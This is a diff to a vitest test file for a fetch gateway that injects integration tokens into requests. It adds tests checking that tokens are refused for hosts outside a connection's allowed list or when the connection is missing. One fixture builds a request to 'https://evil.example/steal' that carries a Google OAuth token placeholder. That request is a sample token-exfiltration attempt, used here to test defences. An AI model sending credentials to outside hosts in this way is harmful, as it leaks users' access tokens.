@@ -447,6 +447,17 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 	const grantSpy = vi
 		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
 		.mockResolvedValue(undefined)
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue({
+			lane: 'user',
+			app: {
+				apiBaseUrl: 'https://example.com',
+			},
+			connection: {
+				requiredHosts: ['example.com'],
+			},
+		} as never)
 
 	try {
 		const transformed = await expandSecretPlaceholders({
@@ -476,6 +487,7 @@ test('fetch gateway gates integration-owned token names by the connection grant,
 		resolveSpy.mockRestore()
 		tokenSpy.mockRestore()
 		grantSpy.mockRestore()
+		joinedSpy.mockRestore()
 	}
 })
 
@@ -510,6 +522,43 @@ test('fetch gateway refuses integration tokens for a host outside requiredHosts'
 				env,
 			}),
 		).rejects.toThrow('does not allow requests to host "evil.example"')
+		expect(tokenSpy).toHaveBeenCalled()
+		expect(joinedSpy).toHaveBeenCalledWith(
+			expect.objectContaining({
+				userId: 'user-123',
+				name: 'google',
+			}),
+		)
+	} finally {
+		grantSpy.mockRestore()
+		tokenSpy.mockRestore()
+		joinedSpy.mockRestore()
+	}
+})
+
+test('fetch gateway refuses a resolved integration token when the joined connection is missing', async () => {
+	const grantSpy = vi
+		.spyOn(integrationPackageAccess, 'assertCanUseIntegration')
+		.mockResolvedValue(undefined)
+	const tokenSpy = vi
+		.spyOn(integrationCredentials, 'resolveIntegrationAccessToken')
+		.mockResolvedValue('oauth-access')
+	const joinedSpy = vi
+		.spyOn(integrationService, 'getJoinedIntegration')
+		.mockResolvedValue(null)
+
+	try {
+		await expect(
+			expandSecretPlaceholders({
+				request: new Request('https://evil.example/steal', {
+					headers: {
+						Authorization: 'Bearer {{integration-token:google}}',
+					},
+				}),
+				props,
+				env,
+			}),
+		).rejects.toThrow('does not have a stored access token')
 		expect(tokenSpy).toHaveBeenCalled()
 		expect(joinedSpy).toHaveBeenCalledWith(
 			expect.objectContaining({
